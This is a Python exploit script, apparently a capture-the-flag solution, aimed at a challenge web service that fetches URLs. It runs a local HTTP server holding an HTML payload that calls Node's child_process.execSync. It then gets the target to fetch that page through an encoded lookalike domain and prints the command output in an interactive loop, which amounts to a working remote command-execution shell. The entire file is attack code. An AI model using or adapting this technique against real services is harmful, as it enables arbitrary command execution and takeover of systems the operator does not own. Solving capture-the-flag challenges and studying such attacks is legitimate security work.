import threading
import requests
import re
from html import unescape
from readline import redisplay

from http.server import SimpleHTTPRequestHandler
import socketserver
from pwn import log, context
from http import HTTPStatus

context.log_level = "INFO"
URL = "https://fetcheval.hackthesystem.pro/"

def make_server(text_html):
    class Handler(SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_html(text_html)
            self.end_headers()

        def send_html(self, string):
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', str(len(string)))
            self.send_header('Last-Modified', self.date_time_string())
            self.end_headers()
            self.wfile.write(string.encode())
    return Handler

def thread(fn):
    def run(*k, **kw):
        t = threading.Thread(target=fn, args=k, kwargs=kw)
        t.start()
        return t
    return run

@thread
def serve(host, port, text):
    address = (host, port)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(address, make_server(text)) as httpd:
        log.info(f"serve @ http://localhost:{address[1]}")
        httpd.handle_request()

def req(x, url=URL):
    res = requests.post(url, data={
        "url": x,
    })
    return res.text


def parse_output(x):
    x = re.search(r"(?<=textarea disabled>).*?(?=</textarea>)", x, re.DOTALL)
    x = x.group(0)
    x = unescape(x)
    return x

def craft_payload(x: str):
    x = x.replace("'", "\\'")
    payload = f"""
data:localhost/html,
<div id='eval'>
    require('child_process').execSync('{x}')
</div>
    """.strip()
    return payload

if __name__ == "__main__":
    address = ("localhost", 4444)
    domain_url = "http://localhost%2eus-1.sharedwithexpose.com"
    while (True):
        cmd = input("$ ").strip()
        redisplay()
        payload = craft_payload(cmd)
        serve(*address, payload)
        res = req(domain_url)
        txt = parse_output(res)
        print(txt)
    
    